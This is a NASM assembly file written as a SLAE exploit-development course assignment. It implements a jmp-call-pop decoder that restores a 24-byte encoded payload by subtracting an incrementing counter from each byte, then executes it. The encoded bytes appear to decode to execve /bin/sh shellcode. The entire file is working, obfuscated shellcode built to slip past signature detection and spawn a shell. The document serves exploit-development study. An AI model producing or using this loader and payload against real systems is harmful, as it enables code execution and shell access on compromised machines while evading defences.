; Filename: SLAEobfuscated.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
; Student ID:  PA-7462
; Purpose: SLAE Assignmnet 4 - Decode shellcode stored in encoded with a predetermined decoding scheme.

global _start			

section .text
_start:
	jmp short call_decoder 	; Jump to section that will call the decoder, which loads shell code address on stack

decoder:
	pop esi			; Place Shellcode address into ESI
	xor ecx, ecx		; Clear ECX
	xor ebx, ebx		; Clear EBX
	xor eax, eax		; Clear EAX
	inc bl			; Increment BL, making ebx 1. Setting up counter to track decoding of shellcode
	mov cl, 24		; Set cl to 24 (length of shellcode)
	
decode:
	mov al, byte [esi]     	; Move the byte from ESI (the encoded shellcode)
	sub al, bl		; Subtract bl from the current shellcode byte. Each bytes was incremented by i+1 each loop
	mov byte [esi], al	; Move the decoded byte of shellcode back to the location at ESI to call later
	inc esi			; Incrememnt ESI by 1 to move to the next byte to decode
	inc bl			; Increment bl by 1 to subtract the next byte by +1
	loop decode		; Loop through Decode until we get through the whole shellcode (24)
	jmp short encoded 	; Jump to the now decoded shellcode


call_decoder:
	call decoder 		; Call decoder section, load "encoded" shellcode address on to stack
	encoded: db 0x32,0xc2,0x53,0x6c,0x34,0x35,0x7a,0x70,0x71,0x39,0x6d,0x75,0x7b,0x97,0xf2,0x60,0x61,0x65,0x9c,0xf5,0xc5,0x21,0xe4,0x98
